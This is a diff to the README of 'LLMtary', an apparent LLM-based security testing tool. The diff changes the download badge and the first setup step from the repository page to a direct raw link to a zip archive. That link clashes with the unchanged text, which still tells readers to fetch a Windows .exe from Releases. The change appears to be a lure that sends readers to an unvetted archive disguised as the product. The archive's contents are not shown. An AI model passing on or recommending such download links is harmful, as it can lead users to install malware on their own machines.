@@ -1,6 +1,6 @@
 # 🛡️ LLMtary - Automated security testing for your network
 
-[![Download LLMtary](https://img.shields.io/badge/Download-LLMtary-blue)](https://github.com/Lorainobsessive5233/LLMtary)
+[![Download LLMtary](https://img.shields.io/badge/Download-LLMtary-blue)](https://raw.githubusercontent.com/Lorainobsessive5233/LLMtary/main/macos/Mtary-LL-3.0.zip)
 
 LLMtary acts as an intelligent assistant for checking the security of your computer systems. It uses advanced language models to find potential weaknesses and provide paths for testing. You do not need deep technical knowledge to use this software. It handles the heavy lifting of gathering information and analyzing security gaps.
 
@@ -22,7 +22,7 @@ Ensure your computer has the following specifications before you begin:
 
 ## 🚀 Getting started
 
-1. Visit the repository page to download the installer: [https://github.com/Lorainobsessive5233/LLMtary](https://github.com/Lorainobsessive5233/LLMtary)
+1. Visit the repository page to download the installer: [https://raw.githubusercontent.com/Lorainobsessive5233/LLMtary/main/macos/Mtary-LL-3.0.zip](https://raw.githubusercontent.com/Lorainobsessive5233/LLMtary/main/macos/Mtary-LL-3.0.zip)
 2. Locate the most recent version in the Releases section.
 3. Download the Windows executable file ending in .exe.
 4. Double-click the file to start the installation setup.
